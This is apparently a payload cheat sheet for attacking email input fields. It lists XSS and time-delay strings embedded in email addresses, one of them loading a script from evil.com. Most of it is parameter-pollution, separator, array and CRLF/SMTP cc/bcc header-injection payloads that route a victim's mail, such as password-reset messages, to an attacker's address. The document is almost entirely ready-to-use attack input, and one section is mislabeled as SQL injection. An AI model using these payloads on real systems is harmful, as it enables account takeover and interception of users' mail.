
## Blind SQLi 
```
"'--><script/src=//evil.com></script>"@example.com
"'-sleep(5)-'"@mail.local
```

## Comma saperator with HPP chain

```
{"email":"Victim@gmail.com,Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com,Attacker@gmail.com"}
```

## Semicolon saperator with HPP chain
```
{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
```

## Space saperator with HPP chain
```
{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
```

## Carbon Copy (CC:) with HPP chain
```
{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
```

## Blind Carbon Copy (BCC:) with HPP chain
```
{"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
```

## Parameter Pollution
```
email=victim@gmail.com&email=attacker@gmail.com
```

## CRLF and SMTP Inejciton
```
email=victim@gmail.com%0a%0dcc:attacker@gmail.com
{"email":["victim@gmail.com","attacker@gmail.com"]}
```

## Using Seperators
```
email=victim@gmail.com,attacker@gmail.com
email=victim@gmail.com|attacker@gmail.com
email=victim@gmail.com%20attacker@gmail.com
```

## HPP chain with Bypass the mail() function protection against email header injection
```
{"email":"Victim@mail.com\r\n \ncc: Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com\r\n \ncc: Attacker@mail.com"}
```
## Array of emails
```
{"email":["victim@mail.com","attacker@mail.com"]}
```
